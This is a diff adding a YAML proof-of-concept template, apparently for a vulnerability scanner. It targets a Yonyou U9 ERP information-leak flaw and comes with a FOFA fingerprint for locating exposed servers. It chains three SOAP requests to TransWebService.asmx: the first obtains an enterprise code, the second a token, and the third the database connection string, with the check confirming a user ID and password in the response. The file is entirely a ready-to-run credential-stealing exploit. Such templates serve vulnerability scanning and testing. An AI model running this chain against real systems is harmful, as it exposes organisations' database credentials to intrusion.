@@ -1,0 +1,53 @@
+id: poc-yaml-yongyou-u9-getconnectionstring-info-leak
+info:
+  name: 用友U9 GetConnectionString 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 用友U9
+  fofa: body="logo-u9.png"
+requests:
+- method: POST
+  path: /CS/Office/TransWebService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetEnterprise
+  data: '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+
+    <soap:Header/>
+
+    <soap:Body>
+
+    <tem:GetEnterprise/>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: status_code == 200 && contains(body,"\"Code\":")
+  output:
+  - regex_match(body,`"Code":"(?P<code>.*?)",`)
+- method: POST
+  path: /CS/Office/TransWebService.asmx
+  headers:
+    SOAPAction: http://tempuri.org/GetToken
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tem=\"\
+    http://tempuri.org/\">\n<soap:Header/>\n<soap:Body>\n<tem:GetToken>\n   <!--type:\
+    \ string-->\n   <tem:endId>{{.code}}</tem:endId>\n</tem:GetToken>\n</soap:Body>\n\
+    </soap:Envelope>"
+  expression: status_code == 200 && contains(body,"\"Token\":")
+  output:
+  - regex_match(body,`"Token":"(?P<token>.*?)","`)
+- method: POST
+  path: /CS/Office/TransWebService.asmx
+  headers:
+    SOAPAction: http://tempuri.org/GetConnectionString
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tem=\"\
+    http://tempuri.org/\">\n<soap:Header/>\n<soap:Body>\n<tem:GetConnectionString>\n\
+    \   <!--type: string-->\n   <tem:token>{{.token}}</tem:token>\n</tem:GetConnectionString>\n\
+    </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 200 && contains(body,"User Id=") && contains(body,"Password=")
+    && contains(body,"Data Source=") && contains(content_type,"application/soap+xml")
+variables: {}
+transport: http
